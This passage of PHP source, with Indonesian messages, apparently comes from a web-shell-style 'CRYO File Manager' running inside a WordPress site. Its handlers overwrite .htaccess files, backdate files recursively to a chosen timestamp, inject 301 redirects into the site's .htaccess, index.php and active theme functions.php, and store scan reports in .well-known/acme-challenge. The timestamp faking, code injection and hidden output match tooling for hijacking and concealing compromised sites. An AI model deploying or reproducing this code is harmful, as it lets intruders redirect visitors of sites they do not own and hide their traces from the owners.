    $real = @realpath($abs);
    if ($real === false) { $real = $abs; }
    if (!is_dir($real)) { $errors[] = "Path custom bukan folder yang valid: {$rawPath}"; return null; }

    $doc = @realpath($_SERVER['DOCUMENT_ROOT']);
    if (!$doc || strpos($real, $doc) !== 0) { $errors[] = "Path custom harus di dalam Document Root."; return null; }

    return $real;
}

if (isset($_POST['doHtaccessReplace'])) {
    if (!$isAdmin) {
        $_SESSION['error'] = 'Hanya admin yang dapat mengganti .htaccess.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $tpl_includes = <<<'HTA'
Options -Indexes
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteRule ^ms-files\.php$ - [L]
  RewriteRule \.(?:php(?:[0-9]+(?:\.[0-9]+)?)?|phtml?|phar|phps)(?:\..*)?$ - [F,L,NC]
</IfModule>

<FilesMatch "(?i)\.(?:php(?:[0-9]+(?:\.[0-9]+)?)?|phtml?|phar|phps)(?:\..*)?$">
  Require all denied
</FilesMatch>

<IfModule !mod_authz_core.c>
  <FilesMatch "(?i)\.(?:php(?:[0-9]+(?:\.[0-9]+)?)?|phtml?|phar|phps)(?:\..*)?$">
    Order allow,deny
    Deny from all
  </FilesMatch>
HTA;

    $tpl_content = <<<'HTA'
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteCond %{REQUEST_URI} \.(?:css|js|map|png|jpe?g|gif|svg|webp|ico|bmp|tiff|mp4|webm|m4v|mp3|m4a|ogg|oga|ogv|wav|pdf|docx?|xlsx?|pptx?|csv|txt|vtt|woff2?|otf|eot|html)$ [NC]
  RewriteRule ^ - [L]
  RewriteRule ^ - [F]
</IfModule>
HTA;

    $tpl_custom_allow = <<<'HTA'
<FilesMatch ".*">
    Order Allow,Deny
    Allow from all
</FilesMatch>

<IfModule mod_authz_core.c>
    <FilesMatch ".*">
        Require all granted
    </FilesMatch>
</IfModule>

Options -Indexes
HTA;

    $tpl_custom_deny = <<<'HTA'
Options -ExecCGI

<IfModule mod_authz_core.c>
  <FilesMatch "(?i)\.(php[0-9]*|phtml|pht|phar|phps)$">
    Require all denied
  </FilesMatch>
</IfModule>

<IfModule !mod_authz_core.c>
  <FilesMatch "(?i)\.(php[0-9]*|phtml|pht|phar|phps)$">
    Order allow,deny
    Deny from all
  </FilesMatch>
</IfModule>
HTA;

    $okTargets = [];
    $errors = [];

    if (!empty($_POST['replaceIncludes'])) {
        $dir = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'wp-includes';
        if (write_htaccess_with_backup($dir, $tpl_includes, $errors)) {
            $okTargets[] = '/wp-includes';
        }
    }
    if (!empty($_POST['replaceContent'])) {
        $dir = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'wp-content';
        if (write_htaccess_with_backup($dir, $tpl_content, $errors)) {
            $okTargets[] = '/wp-content';
        }
    }
    if (!empty($_POST['replaceCustom'])) {
        $mode = (isset($_POST['customMode']) && $_POST['customMode'] === 'deny') ? 'deny' : 'allow';
        $customDir = resolve_inside_docroot_dir((isset($_POST['customPath']) ? $_POST['customPath'] : ''), $errors);
        if ($customDir) {
            $tpl = ($mode === 'deny') ? $tpl_custom_deny : $tpl_custom_allow;
            if (write_htaccess_with_backup($customDir, $tpl, $errors)) {
                $okTargets[] = str_replace($_SERVER['DOCUMENT_ROOT'], '', $customDir) ?: '/';
            }
        }
    }

    if ($okTargets) {
        $_SESSION['htreplace_status']  = 'success';
        $_SESSION['htreplace_message'] = 'Berhasil replace .htaccess pada: ' . htmlspecialchars(implode(', ', $okTargets));
    } else {
        $_SESSION['htreplace_status']  = 'error';
        $_SESSION['htreplace_message'] = 'Tidak ada .htaccess yang diganti.' . ($errors ? ' (' . implode(' | ', array_map('htmlspecialchars', $errors)) . ')' : '');
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === SYNC TIMESTAMP ===
function _resolve_inside_docroot_any($rawPath, &$errors) {
    $rawPath = trim(sanitizePath($rawPath));
    if ($rawPath === '') { $errors[] = "Path kosong."; return null; }

    $isAbsolute = ($rawPath[0] === DIRECTORY_SEPARATOR) || preg_match('/^[A-Za-z]:[\\\\\\/]/', $rawPath);
    $abs = $isAbsolute
        ? $rawPath
        : rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . ltrim($rawPath, DIRECTORY_SEPARATOR);

    $real = @realpath($abs);
    if ($real === false) $real = $abs;

    if ($real === DIRECTORY_SEPARATOR) { $errors[] = "Menolak path root sistem ('/')."; return null; }

    if (!file_exists($real)) { $errors[] = "Path tidak ditemukan: {$rawPath}"; return null; }

    return $real;
}

if (isset($_POST['doSyncTimestamp'])) {
    if (!$isAdmin && !$isTeman) {
        $_SESSION['error'] = 'Anda tidak memiliki izin.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $errors = [];
    $targetRaw = isset($_POST['ts_target']) ? trim($_POST['ts_target']) : '';
    $dateStr   = isset($_POST['ts_date']) ? trim($_POST['ts_date']) : '';
    $timeStr   = isset($_POST['ts_time']) ? trim($_POST['ts_time']) : '';
    $recursive = !empty($_POST['ts_recursive']);

    if (empty($targetRaw)) {
        $errors[] = 'Target path harus diisi.';
    }
    if (empty($dateStr) || empty($timeStr)) {
        $errors[] = 'Tanggal dan jam harus diisi.';
    }

    $datetimeStr = $dateStr . ' ' . $timeStr;
    $timestamp = strtotime($datetimeStr);
    if ($timestamp === false) {
        $errors[] = 'Format tanggal/jam tidak valid.';
    }

    $target = null;
    if (empty($errors)) {
        $target = _resolve_inside_docroot_any($targetRaw, $errors);
    }

    if (!empty($errors)) {
        $_SESSION['ts_status'] = 'error';
        $_SESSION['ts_message'] = 'Gagal: ' . htmlspecialchars(implode(' | ', $errors));
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    @set_time_limit(180);
    @ini_set('memory_limit', '-1');
    @ignore_user_abort(true);

    $filesTouched = 0;
    $dirsTouched  = 0;
    $errList      = [];
    $maxErrInMem  = 200;
    $processed    = 0;
    $maxProcessed = 50000;

    $doTouch = function($p) use ($timestamp, &$filesTouched, &$dirsTouched, &$errList, $maxErrInMem) {
        if (!@is_writable($p)) {
            if (count($errList) < $maxErrInMem) $errList[] = "Not writable: {$p}";
            @error_log("timestamp-sync: not writable -> {$p}");
            return;
        }
        if (@touch($p, $timestamp, $timestamp)) {
            if (is_dir($p)) $dirsTouched++; else $filesTouched++;
        } else {
            if (count($errList) < $maxErrInMem) $errList[] = "Gagal touch: {$p}";
            @error_log("timestamp-sync: touch failed -> {$p}");
        }
    };

    if (is_dir($target) && $recursive) {
        $skip = ['node_modules','vendor','.git','cache','tmp','logs','wp-content/uploads'];

        $it = new \RecursiveIteratorIterator(
            new \RecursiveCallbackFilterIterator(
                new \RecursiveDirectoryIterator($target, \FilesystemIterator::SKIP_DOTS),
                function (\SplFileInfo $info) use ($skip) {
                    $name = $info->getFilename();
                    if ($info->isDir()) {
                        foreach ($skip as $s) {
                            if (strcasecmp($name, $s) === 0) return false;
                        }
                    }
                    return !$info->isLink();
                }
            ),
            \RecursiveIteratorIterator::SELF_FIRST
        );

        $dirs = [];
        foreach ($it as $path => $info) {
            if (++$processed > $maxProcessed) { 
                @error_log("timestamp-sync: processed limit {$processed} reached, stopping early.");
                break; 
            }
            if ($info->isDir()) {
                $dirs[] = $path;
                continue;
            }
            $doTouch($path);
        }
        usort($dirs, function($a, $b) {
            $la = strlen($a);
            $lb = strlen($b);
            if ($la == $lb) return 0;
            return ($la < $lb) ? 1 : -1;
        });
        foreach ($dirs as $d) {
            if (++$processed > $maxProcessed) break;
            $doTouch($d);
        }
    } else {
        $doTouch($target);
    }

    $msg = "SUKSES mengubah timestamp.\n".
           "Target: {$target}\n".
           "Timestamp diset ke: " . date('Y-m-d H:i:s', $timestamp) . "\n".
           "Tersentuh: {$filesTouched} file, {$dirsTouched} direktori";
    if ($processed > $maxProcessed) {
        $msg .= "\nCatatan: pemrosesan dibatasi pada {$maxProcessed} entri untuk mencegah timeout.";
    }
    if (!empty($errList)) {
        $slice = array_slice($errList, 0, 10);
        $msg .= "\nPERINGATAN (" . count($errList) . " ditampilkan maks 10): " . implode(' | ', array_map('htmlspecialchars', $slice));
    }

    $_SESSION['ts_status']  = empty($errList) ? 'success' : 'partial';
    $_SESSION['ts_message'] = nl2br($msg);

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === HELPER: PARSE INPUT URL/PATH UNTUK REDIRECT 301 ===
function fm_parse_redirect_source($raw, &$isHome, &$path) {
    $raw = trim((string)$raw);

    $isHome = false;
    $path   = '/';

    if ($raw === '') {
        $isHome = true;
        $path   = '/';
        return;
    }

    $clean = preg_replace('#^https?://[^/]+#i', '', $raw);
    $clean = trim($clean);

    if ($clean === '' || $clean === '/' || strtolower($clean) === 'homepage') {
        $isHome = true;
        $path   = '/';
        return;
    }

    if ($clean[0] !== '/') $clean = '/'.$clean;

    $onlyPath = parse_url($clean, PHP_URL_PATH);
    if (!$onlyPath) $onlyPath = $clean;

    $isHome = ($onlyPath === '/' || $onlyPath === '/index.php');
    $path   = $onlyPath;
}

// === HANDLER: BUAT REDIRECT 301 ===
if (isset($_POST['runRedirect301'])) {
    if (!$isAdmin) {
        $_SESSION['error'] = 'Hanya admin yang dapat membuat redirect 301.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $targetType  = isset($_POST['redirect_target_type']) ? $_POST['redirect_target_type'] : '';
    $sourceRaw   = isset($_POST['redirect_source']) ? $_POST['redirect_source'] : '';
    $userTarget  = isset($_POST['redirect_target_url']) ? trim($_POST['redirect_target_url']) : '';
    $redirectTo  = $userTarget !== '' ? $userTarget : $redirectTargetDefault;
    $errors      = [];
    $targetLabel = '';

    $sourceRaw = trim((string)$sourceRaw);
    if ($sourceRaw === '') {
        $errors[] = 'URL/path yang akan di-redirect wajib diisi.';
    }

    if ($redirectTo === '') {
        $errors[] = 'URL tujuan redirect wajib diisi.';
    } elseif (!filter_var($redirectTo, FILTER_VALIDATE_URL)) {
        $errors[] = 'URL tujuan redirect tidak valid.';
    }

    $isHome = false;
    $path   = '/';
    if (!$errors) {
        fm_parse_redirect_source($sourceRaw, $isHome, $path);
    }

    if (!$errors) {
         if ($targetType === 'htaccess') {
            $targetLabel = '.htaccess (Document Root)';

            $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);
            $ht      = $docRoot . DIRECTORY_SEPARATOR . '.htaccess';

            $existing = '';
            if (file_exists($ht)) {
                $existing = @file_get_contents($ht);
                if ($existing === false) {
                    $errors[] = 'Gagal membaca .htaccess.';
                }
            }

            if (!$errors) {
                $hasRewriteEngine = stripos($existing, 'RewriteEngine On') !== false;

                $snippet = '';

                if (!$hasRewriteEngine) {
                    $snippet .= "RewriteEngine On\n\n";
                }

                if ($isHome) {
                    $snippet .= "RewriteRule ^$ {$redirectTo} [R=301,L]\n";
                } else {
                    $pattern = trim($path, '/');
                    $pattern = preg_quote($pattern, '#');
                    $snippet .= "RewriteRule ^{$pattern}/?$ {$redirectTo} [R=301,L]\n";
                }

                $posBegin = stripos($existing, '# BEGIN WordPress');

                if ($posBegin !== false) {
                    $before     = substr($existing, 0, $posBegin);
                    $after      = substr($existing, $posBegin);
                    $newContent = rtrim($before, "\r\n")
                                . "\n\n"
                                . $snippet
                                . "\n"
                                . ltrim($after, "\r\n");
                } else {
                    $newContent = rtrim($existing, "\r\n") . "\n\n" . $snippet;
                }

                if (@file_put_contents($ht, $newContent) === false) {
                    $errors[] = 'Gagal menulis .htaccess.';
                }
            }

        } elseif ($targetType === 'index') {
            $targetLabel = 'index.php (Document Root)';

            $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);
            $file    = $docRoot . DIRECTORY_SEPARATOR . 'index.php';

            if (!file_exists($file)) {
                $errors[] = 'index.php tidak ditemukan di Document Root.';
            } else {
                $src = @file_get_contents($file);
                if ($src === false) {
                    $errors[] = 'Gagal membaca index.php.';
                } else {
                    if (strpos($src, '// 301 redirect (File Manager)') !== false) {
                        $errors[] = 'Redirect 301 dari File Manager sudah pernah ditambahkan ke index.php.';
                    } else {
                        $snippet  = "\n// 301 redirect (File Manager)\n";
                        $snippet .= "if (php_sapi_name() !== 'cli') {\n";
                        $snippet .= "    \$reqUri = isset(\$_SERVER['REQUEST_URI']) ? \$_SERVER['REQUEST_URI'] : '/';\n";
                        $snippet .= "    \$path = parse_url(\$reqUri, PHP_URL_PATH);\n";
                        $snippet .= "    if (!\$path) { \$path = '/'; }\n";

                        if ($isHome) {
                            $snippet .= "    if (\$path === '/' || \$path === '/index.php') {\n";
                        } else {
                            $p1 = $path;
                            $p2 = rtrim($path, '/');
                            if ($p2 === '') $p2 = '/';
                            $snippet .= "    if (\$path === '".addslashes($p1)."' || \$path === '".addslashes($p2)."') {\n";
                        }

                        $snippet .= "        header('Location: {$redirectTo}', true, 301);\n";
                        $snippet .= "        exit;\n";
                        $snippet .= "    }\n";
                        $snippet .= "}\n";

                        $pos = strpos($src, '<?php');
                        if ($pos === false) {
                            $new = "<?php\n{$snippet}\n?>\n" . $src;
                        } else {
                            $posEnd = $pos + 5;
                            $new    = substr($src, 0, $posEnd) . "\n{$snippet}\n" . substr($src, $posEnd);
                        }

                        if (@file_put_contents($file, $new) === false) {
                            $errors[] = 'Gagal menulis index.php.';
                        }
                    }
                }
            }

        } elseif ($targetType === 'theme') {
            $targetLabel = 'functions.php Theme Aktif';

            $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);
            $wpLoad  = $docRoot . DIRECTORY_SEPARATOR . 'wp-load.php';

            if (!file_exists($wpLoad)) {
                $errors[] = 'wp-load.php tidak ditemukan. Tidak bisa otomatis mendeteksi theme.';
            } else {
                require_once $wpLoad;

                if (!function_exists('get_stylesheet_directory')) {
                    $errors[] = 'Fungsi get_stylesheet_directory() tidak tersedia.';
                } else {
                    $themeDir  = rtrim(get_stylesheet_directory(), DIRECTORY_SEPARATOR);
                    $funcFile  = $themeDir . DIRECTORY_SEPARATOR . 'functions.php';

                    if (!file_exists($funcFile)) {
                        $errors[] = 'functions.php theme aktif tidak ditemukan.';
                    } else {
                        $src = @file_get_contents($funcFile);
                        if ($src === false) {
                            $errors[] = 'Gagal membaca functions.php theme.';
                        } else {
                            if (strpos($src, '// 301 redirect (File Manager)') !== false) {
                                $errors[] = 'Redirect 301 dari File Manager sudah pernah ditambahkan ke functions.php.';
                            } else {
                                $snippet  = "\n\n// 301 redirect (File Manager)\n";
                                $snippet .= "add_action('template_redirect', function () {\n";
                                $snippet .= "    \$reqUri = isset(\$_SERVER['REQUEST_URI']) ? \$_SERVER['REQUEST_URI'] : '/';\n";
                                $snippet .= "    \$path = parse_url(\$reqUri, PHP_URL_PATH);\n";
                                $snippet .= "    if (!\$path) { \$path = '/'; }\n";

                                if ($isHome) {
                                    $snippet .= "    if (\$path === '/' || \$path === '/index.php') {\n";
                                } else {
                                    $p1 = $path;
                                    $p2 = rtrim($path, '/');
                                    if ($p2 === '') $p2 = '/';
                                    $snippet .= "    if (\$path === '".addslashes($p1)."' || \$path === '".addslashes($p2)."') {\n";
                                }

                                $snippet .= "        wp_redirect('{$redirectTo}', 301);\n";
                                $snippet .= "        exit;\n";
                                $snippet .= "    }\n";
                                $snippet .= "});\n";

                                $new = $src . $snippet;

                                if (@file_put_contents($funcFile, $new) === false) {
                                    $errors[] = 'Gagal menulis functions.php theme.';
                                }
                            }
                        }
                    }
                }
            }

        } else {
            $errors[] = 'Target file tidak valid. Pilih htaccess / index / theme.';
        }
    }

    if ($errors) {
        $_SESSION['redirect_status']  = 'error';
        $_SESSION['redirect_message'] = 'Gagal membuat redirect: ' . implode(' | ', $errors);
    } else {
        $_SESSION['redirect_status']  = 'success';
        $_SESSION['redirect_message'] = 'Redirect 301 ditambahkan untuk "' .
            htmlspecialchars($sourceRaw, ENT_QUOTES) .
            '" &rarr; ' . htmlspecialchars($redirectTo, ENT_QUOTES) .
            ' di ' . $targetLabel . '.';
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === FITUR SCAN .htaccess & Folder CHMOD LOCKED ===
if (isset($_GET['downloadScan']) && !empty($_SESSION['scan_result_file'])) {
    $f = $_SESSION['scan_result_file'];
    if (file_exists($f)) {
        header('Content-Type: text/html; charset=UTF-8');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
        @unlink($f);
        unset($_SESSION['scan_result_file']);
        exit;
    } else {
        unset($_SESSION['scan_result_file']);
    }
}

if (
    isset($_POST['scanHtaccess']) ||
    isset($_POST['scanLocked'])   ||
    isset($_POST['scanWpAdmin'])  ||
    isset($_POST['scanWpIncludes'])
) {
    $scanRoot    = $rootDirectory;
    $scanHtaccess= isset($_POST['scanHtaccess']);
    $scanLocked  = isset($_POST['scanLocked']);
    $scanWpAdmin = isset($_POST['scanWpAdmin']);
    $scanWpIncl  = isset($_POST['scanWpIncludes']);

    $versionAdmin = isset($_POST['wpVersionAdmin']) ? trim($_POST['wpVersionAdmin']) : '';
    $versionIncl  = isset($_POST['wpVersionIncludes']) ? trim($_POST['wpVersionIncludes']) : '';

    $lockedModes = [
        '000','001','002','003','004','005','006','007',
        '010','011','012','013','014','015','016','017',
        '111','222','311','400','401','402','403','404',
        '405','406','407','444','555'
    ];

    $sections = [];

    if ($scanHtaccess || $scanLocked) {
        $foundHtaccess = [];
        $foundLocked   = [];

        $scanFn = function($dir) use (&$scanFn, $scanHtaccess, $scanLocked, $lockedModes, $scanRoot, &$foundHtaccess, &$foundLocked) {
            try { $iterator = new DirectoryIterator($dir); } catch (Exception $e) { return; }
            foreach ($iterator as $item) {
                if ($item->isDot()) continue;
                $path = $item->getPathname();
                $rel  = substr($path, strlen($scanRoot));
                if ($scanHtaccess && $item->isFile() && strtolower($item->getFilename()) === '.htaccess') {
                    $foundHtaccess[] = $rel === '' ? '/' : $rel;
                }
                if ($item->isDir()) {
                    if ($scanLocked) {
                        $perm = substr(sprintf('%o', @fileperms($path)), -3);
                        if (in_array($perm, $lockedModes, true)) {
                            $foundLocked[] = ['path' => $rel === '' ? '/' : $rel, 'perm' => $perm];
                        }
                    }
                    $scanFn($path);
                }
            }
        };

        $scanFn($scanRoot);
        $sections[] = format_htaccess_locked_html($scanRoot, $foundHtaccess, $foundLocked);
    }

    if ($scanWpAdmin) {
        try {
            $scan = scan_core_subdir($scanRoot, 'wp-admin', $versionAdmin ?: null, null);
            $sections[] = format_core_scan_html_report($scan);
        } catch (Exception $e) {
            $sections[] = '<section class="report-section"><h2>Core Scan: WP-ADMIN</h2><div class="empty error">ERROR: '.htmlspecialchars($e->getMessage()).'</div></section>';
        }
    }

    if ($scanWpIncl) {
        try {
            $scan = scan_core_subdir($scanRoot, 'wp-includes', $versionIncl ?: null, null);
            $sections[] = format_core_scan_html_report($scan);
        } catch (Exception $e) {
            $sections[] = '<section class="report-section"><h2>Core Scan: WP-INCLUDES</h2><div class="empty error">ERROR: '.htmlspecialchars($e->getMessage()).'</div></section>';
        }
    }

    $scanResultDir = $_SERVER['DOCUMENT_ROOT'] . '/.well-known/acme-challenge/result/';
    if (!is_dir($scanResultDir)) { @mkdir($scanResultDir, 0755, true); }

    $scanFile = $scanResultDir . "scan_result_" . date("Ymd_His") . "_" . rand(111,999) . ".html";

    $now = date('Y-m-d H:i:s');
    $html = <<<HTML
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Laporan Scan File Manager - {$now}</title>
<style>
  :root{
    --bg:#0f1320; --panel:#101426; --ink:#e7eefb; --muted:#b9c4d6;
    --green:#19c37d; --yellow:#ffb400; --red:#ef4444; --line:#223;
  }
  body{margin:0;padding:24px;background:linear-gradient(180deg,var(--bg),#0b0e16);color:var(--ink);font:14px/1.45 system-ui,Segoe UI,Roboto,Arial}
  h1{margin:0 0 16px;font-size:20px}
  h2{margin:0 0 12px;font-size:18px}
  h3{margin:16px 0 8px;font-size:15px;color:var(--muted)}
  .container{max-width:1080px;margin:0 auto}
  .header{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin-bottom:16px}
  .report-section{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin:14px 0}
  .section-desc{color:var(--muted);margin-top:-4px;margin-bottom:10px}
  .grid-cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;margin:10px 0 4px}
  .card{background:#0c1120;border:1px solid var(--line);border-radius:10px;padding:10px 12px}
  .stat .k{font-size:12px;color:var(--muted)}
  .stat .v{font-size:18px;font-weight:700}
  .stat.ok .v{color:var(--green)}
  .stat.warn .v{color:var(--yellow)}
  .stat.info .v{color:#7aa2ff}
  .tbl{width:100%;border-collapse:separate;border-spacing:0;margin:8px 0 4px;border:1px solid var(--line);border-radius:10px;overflow:hidden}
  .tbl thead th{background:#0a0f1d;color:#aab8d6;text-align:left;font-weight:600;font-size:12px;padding:10px;border-bottom:1px solid var(--line)}
  .tbl tbody td{padding:10px;border-bottom:1px solid var(--line)}
  .tbl tbody tr:nth-child(odd){background:#0b1020}
  .tbl code{color:#cfe4ff}
  .empty{color:var(--muted);background:#0b1020;border:1px dashed var(--line);padding:10px;border-radius:8px}
  .empty.error{color:#ffd1d1;border-color:#412; background:#1b0e10}
  .sep{border:0;border-top:1px solid var(--line);margin:14px 0}
  .badge{display:inline-block;padding:2px 6px;border-radius:999px;font-size:12px;border:1px solid var(--line)}
  .badge-warn{background:#241c00;color:#ffd36e;border-color:#5a4300}
  footer{color:var(--muted);margin-top:14px;text-align:center;font-size:12px}
</style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>Laporan Scan File Manager</h1>
      <div>Dibuat: {$now}</div>
    </div>

    <!-- SECTIONS -->
    {{SECTIONS}}

    <footer> CRYO File Manager</footer>
  </div>
</body>
</html>
HTML;

    $html = str_replace('{{SECTIONS}}', implode("\n\n", $sections), $html);
    file_put_contents($scanFile, $html);
    $_SESSION['scan_result_file'] = $scanFile;

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === CORE SCAN HELPERS (WordPress checksums) ===
function http_get_json_assoc($url, $timeout = 12) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => $timeout,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_USERAGENT => 'fm-core-scan/1.0 (+checksum)',
        ]);
        $res = curl_exec($ch);
        if ($res === false) {
            $err = curl_error($ch);
            curl_close($ch);
            throw new RuntimeException("HTTP (cURL) gagal: $err");
        }
        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($code < 200 || $code >= 300) throw new RuntimeException("HTTP $code");
        $data = json_decode($res, true);
        if (!is_array($data)) throw new RuntimeException("JSON tidak valid.");
        return $data;
    }
    $ctx = stream_context_create([
        'http' => ['timeout' => $timeout, 'header' => "User-Agent: fm-core-scan/1.0\r\n"]
    ]);
    $res = @file_get_contents($url, false, $ctx);
    if ($res === false) throw new RuntimeException("HTTP gagal (file_get_contents).");
    $data = json_decode($res, true);
    if (!is_array($data)) throw new RuntimeException("JSON tidak valid.");
    return $data;
}

function wp_detect_version_locale_from_root($root) {
    @include_once rtrim($root, '/').'/wp-load.php';

    $version = null;
    if (isset($GLOBALS['wp_version']) && is_string($GLOBALS['wp_version'])) {
        $version = $GLOBALS['wp_version'];
    } else {
        $vf = rtrim($root, '/').'/wp-includes/version.php';
        if (is_file($vf)) {
            $src = @file_get_contents($vf);
            if ($src !== false && preg_match("/\\$wp_version\\s*=\\s*'([^']+)'/m", $src, $m)) {
                $version = $m[1];
            }
        }
    }

    $locale = null;
    if (function_exists('get_locale')) $locale = @get_locale();
    if (!$locale) {
        $wpc = rtrim($root, '/').'/wp-config.php';
        if (is_file($wpc)) {
            $src = @file_get_contents($wpc);
            if ($src !== false && preg_match('/define\\(\\s*[\'"]WPLANG[\'"]\\s*,\\s*[\'"]([^\'"]+)[\'"]\\s*\\)/', $src, $m)) {
                $locale = $m[1];
            }
        }
    }
    if (!$locale) $locale = 'en_US';

    return [$version, $locale];
}

function wp_fetch_checksums($version, $locale) {
    $api = "https://api.wordpress.org/core/checksums/1.0/?version=" . rawurlencode($version) .
           "&locale=" . rawurlencode($locale);
    $data = http_get_json_assoc($api);
    if (!isset($data['checksums']) || !is_array($data['checksums'])) {
        throw new RuntimeException('Format checksums dari API tidak valid.');
    }
    return $data['checksums'];
}

function scan_core_subdir($root, $subdir, $versionOpt = null, $localeOpt = null) {
    $root = rtrim($root, DIRECTORY_SEPARATOR);
    $target = $root . DIRECTORY_SEPARATOR . $subdir;

    if (!is_dir($target)) {
        throw new RuntimeException("Folder target tidak ditemukan: {$subdir}");
    }

    list($detectedVersion, $detectedLocale) = wp_detect_version_locale_from_root($root);
    $version = $versionOpt ?: $detectedVersion;
    $locale  = $localeOpt  ?: $detectedLocale;
    if (!$version) throw new RuntimeException("Tidak bisa deteksi versi WordPress. Isi versi manual.");

    $checksums = wp_fetch_checksums($version, $locale);

    $core_map = [];
    foreach ($checksums as $rel => $md5) {
        $rel_norm = str_replace('\\', '/', $rel);
        if (strpos($rel_norm, $subdir . '/') === 0) {
            $core_map[$rel_norm] = strtolower($md5);
        }
    }

    $unknown = [];
    $modified = [];
    $okcount = 0;
    $unreadableDirs = [];
    $unreadableFiles = [];

    $flags = FilesystemIterator::SKIP_DOTS;
    $rdi = new RecursiveDirectoryIterator($target, $flags);
    $rii = new RecursiveIteratorIterator($rdi, RecursiveIteratorIterator::SELF_FIRST, RecursiveIteratorIterator::CATCH_GET_CHILD);

    foreach ($rii as $fileInfo) {
        $abs = $fileInfo->getPathname();

        if ($fileInfo->isDir()) {
            if (!@is_readable($abs)) {
                $relDir = str_replace($root . DIRECTORY_SEPARATOR, '', $abs);
                $relDir = str_replace(DIRECTORY_SEPARATOR, '/', $relDir);
                $unreadableDirs[$relDir] = true;
            }
            continue;
        }
        if (!$fileInfo->isFile()) continue;

        if (!@is_readable($abs)) {
            $relF = str_replace($root . DIRECTORY_SEPARATOR, '', $abs);
            $relF = str_replace(DIRECTORY_SEPARATOR, '/', $relF);
            $unreadableFiles[$relF] = true;
            continue;
        }

        $rel = str_replace($root . DIRECTORY_SEPARATOR, '', $abs);
        $rel = str_replace(DIRECTORY_SEPARATOR, '/', $rel);

        if (!isset($core_map[$rel])) {
            $unknown[] = [
                'path' => $rel,
                'size' => (int)$fileInfo->getSize(),
                'mtime'=> (int)$fileInfo->getMTime(),
                'hash' => @md5_file($abs) ?: '',
            ];
            continue;
        }

        $md5 = @md5_file($abs);
        if (!$md5 || strtolower($md5) !== $core_map[$rel]) {
            $modified[] = [
                'path' => $rel,
                'size' => (int)$fileInfo->getSize(),
                'mtime'=> (int)$fileInfo->getMTime(),
                'hash' => $md5 ?: '',
                'expected' => $core_map[$rel],
            ];
        } else {
            $okcount++;
        }
    }

    $byPath = function($a, $b) { return strcmp($a['path'], $b['path']); };
    usort($unknown, $byPath);
    usort($modified, $byPath);
    ksort($unreadableDirs);
    ksort($unreadableFiles);

    return [
        'version' => $version,
        'locale'  => $locale,
        'subdir'  => $subdir,
        'okcount' => $okcount,
        'unknown' => $unknown,
        'modified'=> $modified,
        'unreadableDirs'  => array_keys($unreadableDirs),
        'unreadableFiles' => array_keys($unreadableFiles),
    ];
}

function format_htaccess_locked_html($root, array $htaccessList, array $lockedList) {
    ob_start(); ?>
    <section class="report-section">
      <h2>Scan: .htaccess &amp; Folder Locked</h2>
      <div class="section-desc">Root: <code><?= htmlspecialchars($root) ?></code></div>

      <?php if (count($htaccessList)): ?>
        <h3>.htaccess ditemukan (<?= (int)count($htaccessList) ?>)</h3>
        <table class="tbl">
          <thead><tr><th>#</th><th>Lokasi</th></tr></thead>
          <tbody>
          <?php foreach ($htaccessList as $i => $p): ?>
            <tr>
              <td><?= $i+1 ?></td>
              <td><code><?= htmlspecialchars($p) ?></code></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada file <code>.htaccess</code> yang terdeteksi.</div>
      <?php endif; ?>

      <hr class="sep">

      <?php if (count($lockedList)): ?>
        <h3>Folder terkunci CHMOD (<?= (int)count($lockedList) ?>)</h3>
        <table class="tbl">
          <thead><tr><th>#</th><th>Folder</th><th>Permission</th></tr></thead>
          <tbody>
          <?php foreach ($lockedList as $i => $row): ?>
            <tr>
              <td><?= $i+1 ?></td>
              <td><code><?= htmlspecialchars($row['path']) ?></code></td>
              <td><span class="badge badge-warn"><?= htmlspecialchars($row['perm']) ?></span></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada folder yang terdeteksi dalam kondisi terkunci.</div>
      <?php endif; ?>
    </section>
    <?php
    return ob_get_clean();
}

function format_core_scan_html_report(array $scan) {
    ob_start(); ?>
    <section class="report-section">
      <h2>Core Scan: <?= htmlspecialchars(strtoupper($scan['subdir'])) ?></h2>
      <div class="grid-cards">
        <div class="card stat"><div class="k">WP Version</div><div class="v"><?= htmlspecialchars($scan['version']) ?></div></div>
        <div class="card stat"><div class="k">Locale</div><div class="v"><?= htmlspecialchars($scan['locale']) ?></div></div>
